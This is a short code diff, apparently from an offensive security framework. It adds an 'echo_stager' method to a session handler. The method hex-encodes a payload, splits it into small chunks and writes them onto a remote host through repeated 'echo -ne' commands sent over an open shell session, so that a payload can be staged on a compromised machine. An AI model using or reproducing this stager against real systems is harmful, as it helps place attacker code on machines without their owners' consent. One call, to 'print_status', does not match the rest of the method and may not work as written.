@@ -58,6 +58,27 @@ class Handler(TCP):
             self.badges.output_error("Failed to handle session!")
             return None
 
+    def echo_stager(self, payload, location, filename, session):
+        self.badges.output_process("Sending payload stage...")
+        path = location + '/' + filename
+
+        echo_stream = 'echo -ne "{}" >> {}'
+        echo_prefix = "\\x"
+        echo_max_length = 30
+
+        size = len(payload)
+        num_parts = int(size / echo_max_length) + 1
+
+        self.badges.output_process(f"Sending payload to {path}")
+        for i in range(0, num_parts):
+            current = i * echo_max_length
+            print_status("Transferring {}/{} bytes".format(current, len(payload)))
+
+            block = str(binascii.hexlify(payload[current:current + echo_max_length]), "utf-8")
+            block = echo_prefix + echo_prefix.join(a + b for a, b in zip(block[::2], block[1::2]))
+            command = echo_stream.format(block, path)
+            session.send_command(command)
+
     def set_session_details(self, payload, session):
         if not session.details['Type']:
             session.details['Type'] = 'custom'
